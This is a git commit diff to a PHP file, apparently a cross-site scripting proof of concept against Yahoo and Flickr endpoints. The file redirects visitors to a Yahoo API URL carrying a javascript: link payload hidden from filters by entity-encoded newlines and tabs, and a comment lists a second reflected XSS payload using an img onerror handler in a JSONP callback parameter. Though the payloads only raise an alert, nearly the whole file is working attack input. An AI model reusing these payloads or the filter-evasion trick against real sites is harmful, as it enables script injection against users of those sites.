83a0badd2dd7d2b7162ef1062b965e5513bba5ad
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-12 23:47:13 +0100

    Update yahoo1.php

--- yahoo1.php
+++ yahoo1.php
@@ -1,2 +1,11 @@
-<?php header('Location: http://api.view.yahoo.com/api/series/aaa%3Ca%20href="ja&NewLine;&Tab;vasc&NewLine;&Tab;ript:alert(document.domain)%3Exss%20me%3C%2Fa%3E"')?>
+<?php 
+
+header('Location: http://api.view.yahoo.com/api/series/aaa%3Ca%20href="ja&NewLine;&Tab;vasc&NewLine;&Tab;ript:alert(document.domain)%3Exss%20me%3C%2Fa%3E"')
+
+
+
+/* https://y-flickr.yahoo.com/ad?rmx=1&count=8&r=1&ri=1190645158&callback=YUI.Env.JSONP.yui_3_16_0_1_1467072000031_1013
+
+https://y-flickr.yahoo.com/ad?rmx=1111&count=8888&r=144444&ri=1190645158&callback=YUI.Env.JSONP.aaa%3Cimg%20src=%20onerror=alert(document.domain)%3E
+*/?>
   
